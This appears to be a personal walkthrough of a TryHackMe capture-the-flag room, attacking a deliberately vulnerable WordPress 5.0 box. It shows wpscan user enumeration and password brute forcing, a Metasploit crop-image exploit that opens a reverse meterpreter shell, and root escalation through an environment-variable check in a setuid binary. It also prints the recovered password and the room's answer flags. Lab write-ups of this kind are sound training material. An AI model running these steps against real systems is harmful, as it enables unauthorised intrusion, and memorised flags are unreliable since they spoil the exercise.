---
Billy Joel made a Wordpress blog! 
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/618f1cc93596ff4082250bce9d869767.png)


Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

Credit to Sq00ky for the root privesc idea ;)

```
┌──(root㉿kali)-[/home/kali]
└─# echo '10.10.126.158 blog.thm' >> /etc/hosts


┌──(kali㉿kali)-[~]
└─$ wpscan --url http://blog.thm --enumerate u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.126.158]
[+] Started: Mon Oct  3 20:41:16 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (0 / 10)  0.00%  ETA: ??:??: Brute Forcing Author IDs - Time: 00:00:00 <> (1 / 10) 10.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:00 <> (2 / 10) 20.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:00 <> (3 / 10) 30.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:01 <> (4 / 10) 40.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:01 <> (5 / 10) 50.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:01 <> (6 / 10) 60.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:02 <> (8 / 10) 80.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:02 <> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 20:41:40 2022
[+] Requests Done: 54
[+] Cached Requests: 8
[+] Data Sent: 13.551 KB
[+] Data Received: 406.224 KB
[+] Memory used: 167.387 MB
[+] Elapsed time: 00:00:23


so

┌──(kali㉿kali)-[~/blog_wp]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n 10.10.142.247  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 22:37 EDT
Nmap scan report for 10.10.142.247
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/3%OT=22%CT=1%CU=43619%PV=Y%DS=2%DC=T%G=Y%TM=633B9CB
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts: blog.thm, BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-10-04T02:38:31+00:00
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-10-04T02:38:31
|_  start_date: N/A


┌──(kali㉿kali)-[~/blog_wp]
└─$ smbclient -L //10.10.142.247                     
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG


┌──(kali㉿kali)-[~/blog_wp]
└─$ smbclient //10.10.142.247/BillySMB
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9788760 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (31.8 KiloBytes/sec) (average 31.8 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (363.6 KiloBytes/sec) (average 285.4 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (3.8 KiloBytes/sec) (average 241.8 KiloBytes/sec)
smb: \> exit
                                                                          
┌──(kali㉿kali)-[~/blog_wp]
└─$ ls
Alice-White-Rabbit.jpg  check-this.png  tswift.mp4


┌──(kali㉿kali)-[~/blog_wp]
└─$ ls
Alice-White-Rabbit.jpg  check-this.png  tswift.mp4
                                                                          
┌──(kali㉿kali)-[~/blog_wp]
└─$ steghide extract -sf Alice-White-Rabbit.jpg  
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
                                                                          
┌──(kali㉿kali)-[~/blog_wp]
└─$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.

The jpg file is a rabbit hole


for qr code

┌──(kali㉿kali)-[~/blog_wp]
└─$ zbarimg                                                        
Command 'zbarimg' not found, but can be installed with:
sudo apt install zbar-tools
Do you want to install it? (N/y)y
sudo apt install zbar-tools
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Suggested packages:
  zbarcam-gtk zbarcam-qt
The following NEW packages will be installed:
  zbar-tools
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 41.1 kB of archives.
After this operation, 108 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 zbar-tools amd64 0.23.92-6 [41.1 kB]
Fetched 41.1 kB in 1s (48.8 kB/s)      
Selecting previously unselected package zbar-tools.
(Reading database ... 395004 files and directories currently installed.)
Preparing to unpack .../zbar-tools_0.23.92-6_amd64.deb ...
Unpacking zbar-tools (0.23.92-6) ...
Setting up zbar-tools (0.23.92-6) ...
Processing triggers for dbus (1.14.0-2) ...
Processing triggers for kali-menu (2022.4.1) ...
Processing triggers for man-db (2.10.2-3) ...
Scanning processes...                                                     
Scanning processor microcode...                                           
Scanning linux images...                                                  

Running kernel seems to be up-to-date.

The processor microcode seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this
 host.
                                                                          
┌──(kali㉿kali)-[~/blog_wp]
└─$ zbarimg -q --raw check-this.png 
https://qrgo.page.link/M6dE

The QRCode is a shortened URL that redirects to https://www.youtube.com/watch?v=eFTLKWw542g (Billy Joel - We Didn’t Start the Fire (Official Video)). 

And the mp4 file is a video that does not contain any hidden hint. 

We know that the version of Wordpress is outdated (version 5.0.0) and we have found 2 users:

    kwheel
    bjoel

Let’s save the users to users.txt and try to brute force: 


┌──(kali㉿kali)-[~/blog_wp]
└─$ wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.142.247]
[+] Started: Mon Oct  3 22:55:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

after a long time
[SUCCESS] - kwheel / cutiepie1  

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1


┌──(kali㉿kali)-[~/blog_wp]
└─$ searchsploit wordpress 5.0.0
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
WordPress 5.0.0 - Image Remote Code Execution                                 | php/webapps/49512.py
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                   | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts       | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                       | php/dos/47800.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)   | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities           | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                     | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                   | php/webapps/48918.sh
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

I will use WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)  because can be use in metasploit if not then the other
using msfconsole

┌──(kali㉿kali)-[~/blog_wp]
└─$ msfconsole -q
msf6 > search wordpress 5.0.0

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framewor
                                         k/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(multi/http/wp_crop_rce) > set rhost blog.thm
rhost => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
username => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
password => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set lhost 10.11.81.220
lhost => 10.11.81.220
msf6 exploit(multi/http/wp_crop_rce) > set lport 4444
lport => 4444
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.11.81.220:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.142.247
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.142.247:55222) at 2022-10-03 23:31:36 -0400

meterpreter > 

We can get a shell from our meterpreter session by running: 

meterpreter > shell
Process 1647 created.
Channel 1 created.
SHELL=/bin/bash script -q /dev/null
www-data@blog:/var/www/wordpress$ 

Checking what file is owned by root and has the setuid bit set reveals the presence of an unknown executable (/usr/sbin/checker): 

www-data@blog:/var/www/wordpress$ find / -type f -user root -perm -u=s 2>/dev/null
<s$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd

Running it outputs that we are “Not an admin”: 

www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin

www-data@blog:/var/www/wordpress$ file /usr/sbin/checker
file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped

The executable is a 64bit ELF


www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++

Running it with ltrace reveals that the executable is checking an environment variable (admin) to determine if we are an admin: 



Let’s create an admin environment variable and set it at 1: 

www-data@blog:/var/www/wordpress$ cd /
cd /
www-data@blog:/$ export admin=1
export admin=1
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/# cd /root
cd /root
root@blog:/root# ll
ll
total 60
drwx------  6 root root  4096 May 28  2020 ./
drwxr-xr-x 24 root root  4096 May 25  2020 ../
lrwxrwxrwx  1 root root     9 May 26  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26  2020 .cache/
drwx------  3 root root  4096 May 26  2020 .gnupg/
drwxr-xr-x  3 root root  4096 May 26  2020 .local/
-rw-------  1 root root   272 May 28  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25  2020 .ssh/
-rw-------  1 root root 13291 May 28  2020 .viminfo
-rw-r--r--  1 root root   215 May 27  2020 .wget-hsts
-rw-r--r--  1 root root    33 May 26  2020 root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318


user.txt

root@blog:/root# find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/root# cat /home/bjoel/user.txt
cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
root@blog:/root# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7



```

![[Pasted image 20221003214536.png]]


root.txt
*9a0b2b618bef9bfa7ac28c1353d9f318*

user.txt
*c8421899aae571f7af486492b71a8ab7*

Where was user.txt found?
Not where you think!
*/media/usb*

```
view-source:http://blog.thm/

powered-by-wordpress

content="WordPress 5.0" 
```

What CMS was Billy using?
*wordpress*

What version of the above CMS was being used?
*5.0*

### Credits 


The images used in this room have been used with the author's permission or in accordance with Section 107 of the U.S. Copyright Act.
https://www.copyright.gov/title17/92chap1.html#107


Congratulations!


[[Web Enumeration]]